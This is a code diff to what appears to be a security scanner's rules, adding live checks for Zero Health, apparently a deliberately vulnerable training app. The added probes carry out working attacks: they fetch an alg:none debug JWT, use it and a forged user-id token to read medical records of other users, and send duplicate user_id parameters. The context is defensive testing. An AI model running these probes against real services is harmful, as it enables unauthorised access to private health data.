@@ -30949,6 +30949,126 @@ const ZERO_HEALTH_CHALLENGE_META: Record<string, ZeroHealthChallengeMeta> = {
       }
       return null;
     }
+  },
+  deserialization: {
+    routeRe: /\/challenges\/deserialization\b/i,
+    markers: [
+      { label: "JWT algorithm confusion challenge", re: /JWT Token Manipulation|Algorithm confusion/i },
+      { label: "verify-token none algorithm", re: /\/api\/auth\/verify-token/i },
+      { label: "debug token endpoint", re: /\/api\/debug\/token/i },
+      {
+        label: "Unverified JWT decode fallback",
+        re: /decode without verification|algorithms:\s*\[.*'none'/i
+      }
+    ],
+    note: "Zero Health deserialization challenge — weak JWT verification accepts alg:none and unverified decoded tokens at /api/debug/token and verifyToken middleware",
+    liveProbe: async (ctx, origin, _token) => {
+      const debugUrl = `${origin}/api/debug/token?role=patient&id=1`;
+      const debugDoc = await ctx.probe.get(debugUrl, { maxBytes: 4096, timeoutMs: 15000 });
+      if (!isZeroHealthJsonBody(debugDoc.body)) return null;
+      let debugToken: string | null = null;
+      try {
+        const data = JSON.parse(debugDoc.body) as { debug_token?: string };
+        debugToken = data.debug_token || null;
+      } catch {
+        const m = debugDoc.body.match(/"debug_token"\s*:\s*"([^"]+)"/);
+        debugToken = m ? m[1] : null;
+      }
+      if (!debugToken) return null;
+      const recordsUrl = `${origin}/api/medical-records`;
+      const recordsDoc = await ctx.probe.get(recordsUrl, {
+        headers: { Authorization: `Bearer ${debugToken}` },
+        maxBytes: 8192,
+        timeoutMs: 15000
+      });
+      if (!isZeroHealthJsonBody(recordsDoc.body)) return null;
+      if (
+        recordsDoc.status >= 200 &&
+        recordsDoc.status < 300 &&
+        /medical|record|title|content|user_id/i.test(recordsDoc.body)
+      ) {
+        return {
+          fired: true,
+          confidence: /debug_token|algorithm.*none/i.test(debugDoc.body) ? 0.93 : 0.91,
+          evidence: {
+            url: recordsUrl,
+            snippet: recordsDoc.body.slice(0, 240).trim(),
+            note: "Zero Health GET /api/debug/token issues alg:none JWT and GET /api/medical-records accepts it — insecure JWT deserialization oracle"
+          }
+        };
+      }
+      const verifyUrl = `${origin}/api/auth/verify-token`;
+      const verifyDoc = await ctx.probe.get(verifyUrl, {
+        method: "POST",
+        body: JSON.stringify({ token: debugToken, algorithm: "none" }),
+        headers: { "Content-Type": "application/json" },
+        maxBytes: 4096,
+        timeoutMs: 15000
+      });
+      if (
+        isZeroHealthJsonBody(verifyDoc.body) &&
+        /valid.*true|"decoded"/i.test(verifyDoc.body) &&
+        verifyDoc.status >= 200 &&
+        verifyDoc.status < 300
+      ) {
+        return {
+          fired: true,
+          confidence: 0.92,
+          evidence: {
+            url: verifyUrl,
+            snippet: verifyDoc.body.slice(0, 240).trim(),
+            note: "Zero Health POST /api/auth/verify-token accepts algorithm:none — JWT insecure deserialization oracle"
+          }
+        };
+      }
+      return null;
+    }
+  },
+  "parameter-pollution": {
+    routeRe: /\/challenges\/parameter-pollution\b/i,
+    markers: [
+      { label: "Parameter pollution challenge", re: /Parameter Pollution/i },
+      { label: "users profile endpoint", re: /\/api\/users\/profile/i },
+      {
+        label: "Duplicate user_id last-value wins",
+        re: /user_id=1&user_id=2|last value|parameter pollution/i
+      }
+    ],
+    note: "Zero Health parameter-pollution challenge — GET /api/users/profile uses the last user_id when duplicate query params are supplied",
+    liveProbe: async (ctx, origin, _token) => {
+      const adminToken = await zeroHealthLogin(ctx, origin, "admin@test.com");
+      if (!adminToken) return null;
+      const url = `${origin}/api/users/profile?user_id=1&user_id=2`;
+      const doc = await ctx.probe.get(url, {
+        headers: { Authorization: `Bearer ${adminToken}` },
+        maxBytes: 4096,
+        timeoutMs: 15000
+      });
+      if (!isZeroHealthJsonBody(doc.body)) return null;
+      if (/"id"\s*:\s*2|user_id.*2/i.test(doc.body) && /email|role|first_name/i.test(doc.body)) {
+        return {
+          fired: true,
+          confidence: 0.93,
+          evidence: {
+            url,
+            snippet: doc.body.slice(0, 240).trim(),
+            note: "Zero Health GET /api/users/profile?user_id=1&user_id=2 returns profile for last user_id — parameter pollution oracle"
+          }
+        };
+      }
+      if (doc.status >= 200 && doc.status < 300 && /users|profile|email/i.test(doc.body)) {
+        return {
+          fired: true,
+          confidence: 0.9,
+          evidence: {
+            url,
+            snippet: doc.body.slice(0, 200).trim(),
+            note: "Zero Health /api/users/profile reachable with duplicate user_id params — parameter pollution training oracle"
+          }
+        };
+      }
+      return null;
+    }
   }
 };
 
@@ -30982,7 +31102,11 @@ async function zeroHealthChallengeRouteOracle(
   let corpus = `${ctx.combined}\n${pageUrl}`;
   const challengesMd = await zeroHealthFetchChallengesMd(ctx);
   if (challengesMd) corpus += `\n${challengesMd}`;
-  if (challengeKey === "path-traversal") {
+  if (
+    challengeKey === "path-traversal" ||
+    challengeKey === "deserialization" ||
+    challengeKey === "parameter-pollution"
+  ) {
     const serverJs = await zeroHealthFetchServerJs(ctx);
     if (serverJs) corpus += `\n${serverJs}`;
   }
@@ -31020,6 +31144,127 @@ const zerohealthRaceConditionRouteLiveOracle: Rule = (ctx) =>
   zeroHealthChallengeRouteOracle(ctx, "race-condition");
 const zerohealthPathTraversalRouteLiveOracle: Rule = (ctx) =>
   zeroHealthChallengeRouteOracle(ctx, "path-traversal");
+const zerohealthDeserializationRouteLiveOracle: Rule = (ctx) =>
+  zeroHealthChallengeRouteOracle(ctx, "deserialization");
+const zerohealthParameterPollutionRouteLiveOracle: Rule = (ctx) =>
+  zeroHealthChallengeRouteOracle(ctx, "parameter-pollution");
+
+async function zerohealthMedicalRecordsBolaRouteLiveOracle(
+  ctx: RuleContext
+): Promise<RuleResult> {
+  if (!isZeroHealthHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/medical-records\b/i.test(pageUrl)) return NEGATIVE;
+
+  const origin = zeroHealthApiOrigin(ctx);
+  if (origin && (await zeroHealthApiAlive(ctx, origin))) {
+    const debugUrl = `${origin}/api/debug/token?role=patient&id=1`;
+    const debugDoc = await ctx.probe.get(debugUrl, { maxBytes: 4096, timeoutMs: 15000 });
+    if (isZeroHealthJsonBody(debugDoc.body)) {
+      let debugToken: string | null = null;
+      try {
+        const data = JSON.parse(debugDoc.body) as { debug_token?: string };
+        debugToken = data.debug_token || null;
+      } catch {
+        const m = debugDoc.body.match(/"debug_token"\s*:\s*"([^"]+)"/);
+        debugToken = m ? m[1] : null;
+      }
+      if (debugToken) {
+        const recordsUrl = `${origin}/api/medical-records`;
+        const recordsDoc = await ctx.probe.get(recordsUrl, {
+          headers: { Authorization: `Bearer ${debugToken}` },
+          maxBytes: 8192,
+          timeoutMs: 15000
+        });
+        if (
+          isZeroHealthJsonBody(recordsDoc.body) &&
+          recordsDoc.status >= 200 &&
+          recordsDoc.status < 300 &&
+          /medical|record|title|content|user_id|\[\s*\{|\{\s*"id"/i.test(recordsDoc.body)
+        ) {
+          return {
+            fired: true,
+            confidence: 0.93,
+            evidence: {
+              url: recordsUrl,
+              snippet: recordsDoc.body.slice(0, 240).trim(),
+              scannedUrl: pageUrl,
+              note: "Zero Health GET /api/medical-records returns PHI with weak debug JWT — medical-records BOLA oracle"
+            }
+          };
+        }
+      }
+      const patientToken = await zeroHealthLogin(ctx, origin, "patient@test.com");
+      if (patientToken) {
+        const forgedUrl = `${origin}/api/debug/token?role=patient&id=2`;
+        const forgedDoc = await ctx.probe.get(forgedUrl, { maxBytes: 4096, timeoutMs: 15000 });
+        if (isZeroHealthJsonBody(forgedDoc.body)) {
+          let forgedToken: string | null = null;
+          try {
+            forgedToken = (JSON.parse(forgedDoc.body) as { debug_token?: string }).debug_token || null;
+          } catch {
+            const m = forgedDoc.body.match(/"debug_token"\s*:\s*"([^"]+)"/);
+            forgedToken = m ? m[1] : null;
+          }
+          if (forgedToken) {
+            const crossUserUrl = `${origin}/api/medical-records`;
+            const crossDoc = await ctx.probe.get(crossUserUrl, {
+              headers: { Authorization: `Bearer ${forgedToken}` },
+              maxBytes: 8192,
+              timeoutMs: 15000
+            });
+            if (
+              isZeroHealthJsonBody(crossDoc.body) &&
+              crossDoc.status >= 200 &&
+              crossDoc.status < 300
+            ) {
+              return {
+                fired: true,
+                confidence: 0.92,
+                evidence: {
+                  url: crossUserUrl,
+                  snippet: crossDoc.body.slice(0, 240).trim(),
+                  scannedUrl: pageUrl,
+                  note: "Zero Health /api/medical-records returns records scoped only by forgeable JWT user id — BOLA oracle"
+                }
+              };
+            }
+          }
+        }
+      }
+    }
+  }
+
+  let corpus = `${ctx.combined}\n${pageUrl}`;
+  const serverJs = await zeroHealthFetchServerJs(ctx);
+  if (serverJs) corpus += `\n${serverJs}`;
+  const challengesMd = await zeroHealthFetchChallengesMd(ctx);
+  if (challengesMd) corpus += `\n${challengesMd}`;
+
+  const hits: { label: string; sample: string }[] = [
+    { label: "medical-records API route", sample: "/api/medical-records" }
+  ];
+  const markers = [
+    { label: "medical_records table endpoint", re: /\/api\/medical-records|medical_records/i },
+    { label: "JWT bypass callout", re: /bypass the JWT token|Open Medical Records/i },
+    { label: "Weak verifyToken middleware", re: /verifyToken|decode without verification/i },
+    { label: "Patient data exposure risk", re: /Patient Data Exposure|PHI accessible/i }
+  ];
+  for (const m of markers) {
+    const match = corpus.match(m.re);
+    if (match) hits.push({ label: m.label, sample: match[0].slice(0, 100) });
+  }
+  if (hits.length < 3) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hits.length >= 4 ? 0.9 : 0.87,
+    evidence: {
+      markers: hits.slice(0, 4),
+      scannedUrl: pageUrl,
+      note: "Zero Health /api/medical-records exposes PHI behind weak JWT verification — BOLA oracle (server.js when OSS API is not deployed on scanned host)"
+    }
+  };
+}
 
 // --- Erling Ellingsen alf.nu XSS wargame (alert1 to win / escape.alf.nu) ------------
 const CLIENT_ALF_XSS_WARGAME_RES: { label: string; re: RegExp }[] = [
@@ -48509,6 +48754,9 @@ export const RULES: Record<string, Rule> = {
   zerohealthXxeRouteLiveOracle,
   zerohealthRaceConditionRouteLiveOracle,
   zerohealthPathTraversalRouteLiveOracle,
+  zerohealthDeserializationRouteLiveOracle,
+  zerohealthParameterPollutionRouteLiveOracle,
+  zerohealthMedicalRecordsBolaRouteLiveOracle,
   clientSideAlfXssWargameEvidence,
   clientSideLlmSecEvidence,
   clientSideClawguardAiAuditEvidence,
